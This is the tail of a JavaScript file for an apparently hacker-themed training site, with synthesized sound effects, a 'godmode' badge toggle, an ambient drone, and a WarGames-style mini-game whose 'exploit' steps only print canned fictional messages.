                for (let i = 0; i < bufferSize; i++) data[i] = (Math.random() * 2 - 1) * Math.exp(-i / (bufferSize * 0.25));
                const noise = ctx.createBufferSource();
                noise.buffer = buffer;
                const filter = ctx.createBiquadFilter();
                filter.type = 'lowpass';
                filter.frequency.setValueAtTime(3500, now);
                filter.frequency.exponentialRampToValueAtTime(150, now + 0.38);
                const gain = ctx.createGain();
                gain.gain.setValueAtTime(0.22, now);
                gain.gain.exponentialRampToValueAtTime(0.001, now + 0.4);
                noise.connect(filter);
                filter.connect(gain);
                gain.connect(ctx.destination);
                noise.start(now);
            } else if (type === 'warpSpeed') {
                [523.25, 659.25, 1046.50, 1318.51].forEach((f, idx) => {
                    const osc = ctx.createOscillator();
                    const gain = ctx.createGain();
                    osc.type = 'triangle';
                    osc.frequency.setValueAtTime(f, now + idx * 0.06);
                    gain.gain.setValueAtTime(0.12, now + idx * 0.06);
                    gain.gain.exponentialRampToValueAtTime(0.001, now + idx * 0.06 + 0.14);
                    osc.connect(gain);
                    gain.connect(ctx.destination);
                    osc.start(now + idx * 0.06);
                    osc.stop(now + idx * 0.06 + 0.16);
                });
            } else if (type === 'matrixGlitch') {
                const osc = ctx.createOscillator();
                const gain = ctx.createGain();
                osc.type = 'square';
                [880, 220, 1760, 440, 120].forEach((f, idx) => {
                    osc.frequency.setValueAtTime(f, now + idx * 0.035);
                });
                gain.gain.setValueAtTime(0.14, now);
                gain.gain.exponentialRampToValueAtTime(0.001, now + 0.2);
                osc.connect(gain);
                gain.connect(ctx.destination);
                osc.start(now);
                osc.stop(now + 0.22);
            } else if (type === 'overclockPulse') {
                [150, 154].forEach(f => {
                    const osc = ctx.createOscillator();
                    const gain = ctx.createGain();
                    osc.type = 'triangle';
                    osc.frequency.setValueAtTime(f, now);
                    gain.gain.setValueAtTime(0.12, now);
                    gain.gain.exponentialRampToValueAtTime(0.001, now + 0.25);
                    osc.connect(gain);
                    gain.connect(ctx.destination);
                    osc.start(now);
                    osc.stop(now + 0.28);
                });
            } else if (type === 'cyberFanfare') {
                playGodModeFanfare();
            } else if (type === 'sonarRadar') {
                [1400, 2800].forEach(f => {
                    const osc = ctx.createOscillator();
                    const gain = ctx.createGain();
                    osc.type = 'sine';
                    osc.frequency.setValueAtTime(f, now);
                    gain.gain.setValueAtTime(0.1, now);
                    gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.75);
                    osc.connect(gain);
                    gain.connect(ctx.destination);
                    osc.start(now);
                    osc.stop(now + 0.8);
                });
            }
        } catch (e) {}
    }

    // Hotkey listener for soundboard keys 1-8
    window.addEventListener('keydown', (e) => {
        const modal = document.getElementById('architectGodModeModal');
        if (!modal || modal.style.display === 'none') return;
        if (['INPUT', 'TEXTAREA'].includes(document.activeElement.tagName)) return;

        const padMap = {
            '1': 'subBass',
            '2': 'laserZap',
            '3': 'empBurst',
            '4': 'warpSpeed',
            '5': 'matrixGlitch',
            '6': 'overclockPulse',
            '7': 'cyberFanfare',
            '8': 'sonarRadar'
        };
        if (padMap[e.key]) {
            const padEl = document.getElementById('pad_' + e.key);
            playCyberPad(padMap[e.key], padEl);
        }
    });

    // --- UNIQUE 3D PHYSICS SANDBOX CONTROLS ---
    function setCelebrationPalette(pal, btnEl) {
        celebration3D.currentPalette = pal;
        document.querySelectorAll('.godmode-sandbox-panel .sandbox-pill-btn[id^="btnPal"]').forEach(b => b.classList.remove('active'));
        if (btnEl) btnEl.classList.add('active');
        trigger3DCelebrationFireworks(pal);
    }

    function setCelebrationGravity(grav, btnEl) {
        celebration3D.gravity = grav;
        document.querySelectorAll('.godmode-sandbox-panel .sandbox-pill-btn[id^="btnGrav"]').forEach(b => b.classList.remove('active'));
        if (btnEl) btnEl.classList.add('active');
        trigger3DCelebrationFireworks();
    }

    function toggleRainbowGodmodeBadge() {
        const isSet = localStorage.getItem('pwnbox_godmode_badge') === 'true';
        const stamp = document.getElementById('pranavStamp');
        const btn = document.getElementById('btnRainbowBadgeToggle');

        if (isSet) {
            localStorage.removeItem('pwnbox_godmode_badge');
            if (stamp) stamp.classList.remove('rainbow-badge-active');
            if (btn) btn.textContent = 'ACTIVATE HOLOGRAPHIC BADGE';
            updateGodModeHUD();
            playTone(400, 'sine', 0.08);
            if (window.showCustomAlert) {
                window.showCustomAlert(
                    "GODMODE DEACTIVATED",
                    "Security clearance reverted to standard operative. Bypass permissions revoked.",
                    "info"
                );
            }
        } else {
            localStorage.setItem('pwnbox_godmode_badge', 'true');
            if (stamp) stamp.classList.add('rainbow-badge-active');
            if (btn) btn.textContent = '✓ ARCHITECT STATUS ACTIVE (DISABLE)';
            updateGodModeHUD();
            playVictorySfx();
            if (window.showCustomAlert) {
                window.showCustomAlert(
                    "👑 ROOT ARCHITECT GRANTED!",
                    "SECURITY CLEARANCE: OMEGA-0 UNRESTRICTED. All training modules on the dashboard are now unlocked with direct bypass, and your rank is elevated to ROOT ARCHITECT!",
                    "success"
                );
            }
        }
    }

    function toggleAmbientAudio() {
        const btn = document.getElementById('btnAmbientAudioToggle');
        if (isAmbientPlaying) {
            if (ambientGain) {
                ambientGain.gain.exponentialRampToValueAtTime(0.0001, getAudioContext().currentTime + 0.5);
                setTimeout(() => {
                    if (ambientSynthOsc1) { ambientSynthOsc1.stop(); ambientSynthOsc1.disconnect(); }
                    if (ambientSynthOsc2) { ambientSynthOsc2.stop(); ambientSynthOsc2.disconnect(); }
                }, 500);
            }
            isAmbientPlaying = false;
            if (btn) btn.textContent = '▶ PLAY SYNTH DRONE';
        } else {
            try {
                const ctx = getAudioContext();
                if (!ctx) return;
                ambientSynthOsc1 = ctx.createOscillator();
                ambientSynthOsc2 = ctx.createOscillator();
                ambientGain = ctx.createGain();

                ambientSynthOsc1.type = 'sawtooth';
                ambientSynthOsc1.frequency.setValueAtTime(55, ctx.currentTime);
                ambientSynthOsc2.type = 'sine';
                ambientSynthOsc2.frequency.setValueAtTime(110, ctx.currentTime);

                ambientGain.gain.setValueAtTime(0.001, ctx.currentTime);
                ambientGain.gain.exponentialRampToValueAtTime(0.04, ctx.currentTime + 1.0);

                ambientSynthOsc1.connect(ambientGain);
                ambientSynthOsc2.connect(ambientGain);
                ambientGain.connect(ctx.destination);

                ambientSynthOsc1.start();
                ambientSynthOsc2.start();
                isAmbientPlaying = true;
                if (btn) btn.textContent = '⏸ PAUSE SYNTH DRONE';
            } catch(e) {}
        }
    }

    // --- RETRO WARGAMES ARCADE ENGINE ---
    let wargamesStage = 1;

    function handleWargamesKey(e) {
        if (e.key === 'Enter') {
            const input = document.getElementById('wargamesInput');
            const cmd = input.value.trim().toLowerCase();
            input.value = '';
            executeWargamesCmd(cmd);
        }
    }

    function executeWargamesCmd(cmd) {
        const out = document.getElementById('wargamesOutput');
        const pill = document.getElementById('wargamesStagePill');
        if (!out) return;

        playKeyClick();

        const row = document.createElement('div');
        row.innerHTML = `<span style="color: #f59e0b;">falken@wopr:~#</span> <span style="color: #ffffff;">${cmd}</span>`;
        out.appendChild(row);

        const resp = document.createElement('div');
        resp.style.marginBottom = '10px';

        if (cmd === 'help') {
            resp.innerHTML = `
                <div style="color: #f59e0b;">TACTICAL W.O.P.R. COMMANDS:</div>
                <div>- <b>probe</b>: Discover active network defense nodes</div>
                <div>- <b>bypass</b>: Exploit authentication gate</div>
                <div>- <b>inject</b>: Deliver buffer exploit payload</div>
                <div>- <b>clear</b>: Clear terminal display</div>
            `;
        } else if (cmd === 'probe') {
            wargamesStage = 2;
            if (pill) pill.textContent = 'STAGE: 2/3 (BYPASSING)';
            resp.innerHTML = `<span style="color: #10b981;">[+] PROBING NORAD GRID...<br/>[+] PORT 2222 FOUND: NORAD CYPHER DAEMON v1.8<br/>[+] Next step: Enter 'bypass' to circumvent authentication gate.</span>`;
        } else if (cmd === 'bypass') {
            if (wargamesStage < 2) {
                resp.innerHTML = `<span style="color: #ef4444;">[!] TARGET NODE UNIDENTIFIED. RUN 'probe' FIRST.</span>`;
            } else {
                wargamesStage = 3;
                if (pill) pill.textContent = 'STAGE: 3/3 (INJECTING)';
                resp.innerHTML = `<span style="color: #38bdf8;">[*] DECRYPTION INTERFACE LOCATED.<br/>[*] MEMORY BUFFER STACK AT 0x7FFFDE90 UNPROTECTED.<br/>[+] Next step: Enter 'inject' to execute memory buffer overflow.</span>`;
            }
        } else if (cmd === 'inject') {
            if (wargamesStage < 3) {
                resp.innerHTML = `<span style="color: #ef4444;">[!] GATEWAYS STILL ARMED. RUN 'probe' THEN 'bypass' FIRST.</span>`;
            } else {
                playVictorySfx();
                if (pill) pill.textContent = 'CLEARED: ARCHITECT VICTORY!';
                resp.innerHTML = `
                    <div style="color: #10b981; border: 1px solid #10b981; padding: 8px;">
                        [✓] EXPLOIT DELIVERED: MEMORY STACK OVERFLOWED!<br/>
                        <b>A STRANGE GAME. THE ONLY WINNING MOVE IS TO PLAY.</b><br/>
                        [STATUS]: NORAD DEFENSE MAINFRAME COMPROMISED BY ARCHITECT PRANAV PUSHYA!
                    </div>
                `;
            }
        } else if (cmd === 'clear') {
            out.innerHTML = '';
            return;
        } else {
            resp.innerHTML = `<span style="color: #ef4444;">Command not recognized. Type 'help'.</span>`;
        }

        out.appendChild(resp);
        out.scrollTop = out.scrollHeight;
    }

    // Expose functions to window
    window.openAirgapModal = openAirgapModal;
    window.closeAirgapModal = closeAirgapModal;
    window.enterPinDigit = enterPinDigit;
    window.clearPin = clearPin;
    window.submitPin = submitPin;
    window.switchVaultTab = switchVaultTab;
    window.filterPayloadCategory = filterPayloadCategory;
    window.updateLivePayloads = updateLivePayloads;
    window.copySpecificPayload = copySpecificPayload;
    window.downloadSpecificPayload = downloadSpecificPayload;
    window.runDarknetShortcut = runDarknetShortcut;
    window.handleDarknetKey = handleDarknetKey;
    window.executeDarknetCmd = executeDarknetCmd;
    window.initDarknetTerminal = initDarknetTerminal;

    window.openGodModeModal = openGodModeModal;
    window.closeGodModeModal = closeGodModeModal;
    window.switchGodModeTab = switchGodModeTab;
    window.startGodModeCelebration3D = startGodModeCelebration3D;
    window.stopGodModeCelebration3D = stopGodModeCelebration3D;
    window.trigger3DCelebrationFireworks = trigger3DCelebrationFireworks;
    window.boostGodmodeXP = boostGodmodeXP;
    window.copyArsenalPayload = copyArsenalPayload;
    window.applySecretTheme = applySecretTheme;
    window.toggleRainbowGodmodeBadge = toggleRainbowGodmodeBadge;
    window.toggleAmbientAudio = toggleAmbientAudio;
    window.handleWargamesKey = handleWargamesKey;
    window.executeWargamesCmd = executeWargamesCmd;
    window.runWargamesShortcut = (cmd) => {
        const input = document.getElementById('wargamesInput');
        if (input) input.value = cmd;
        executeWargamesCmd(cmd);
        if (input) input.value = '';
    };

    window.toggleArchitectXRay = toggleArchitectXRay;
    window.autoClearAllAcademyModules = autoClearAllAcademyModules;
    window.openRootCertificateModal = openRootCertificateModal;
    window.closeRootCertificateModal = closeRootCertificateModal;
    window.injectMasterCtfFlags = injectMasterCtfFlags;
    window.applyCustomAuraAndRank = applyCustomAuraAndRank;
    window.updateAuraPillUI = updateAuraPillUI;
    window.playCyberPad = playCyberPad;
    window.setCelebrationPalette = setCelebrationPalette;
    window.setCelebrationGravity = setCelebrationGravity;

    // Backdrop click dismiss for all secret modals
    ['airgapPinpadModal', 'architectGodModeModal', 'declassifiedArchiveModal', 'secretArchitectModal', 'architectCertificateModal'].forEach(id => {
        const el = document.getElementById(id);
        if (el) {
            el.addEventListener('click', (e) => {
                if (e.target === el) {
                    el.style.display = 'none';
                    playClickSound();
                }
            });
        }
    });

    // Global Escape key dismisses open secret modals
    window.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') {
            ['airgapPinpadModal', 'architectGodModeModal', 'declassifiedArchiveModal', 'secretArchitectModal', 'architectCertificateModal'].forEach(id => {
                const el = document.getElementById(id);
                if (el && el.style.display !== 'none') {
                    el.style.display = 'none';
                    playClickSound();
                }
            });
        }
    });

    // --- INIT ON DOM READY ---
    document.addEventListener('DOMContentLoaded', () => {
        initStamp();
        initBreachGame();
        initRadar();
        initEasterEggs();
        initAgentCardGenerator();
        initAirgapPinpad();

        // Check persistent rainbow badge & HUD
        updateGodModeHUD();
        if (localStorage.getItem('pwnbox_godmode_badge') === 'true') {
            const stamp = document.getElementById('pranavStamp');
            if (stamp) stamp.classList.add('rainbow-badge-active');
            const btn = document.getElementById('btnRainbowBadgeToggle');
            if (btn) btn.textContent = '✓ ARCHITECT STATUS ACTIVE (DISABLE)';
        }
    });
})();
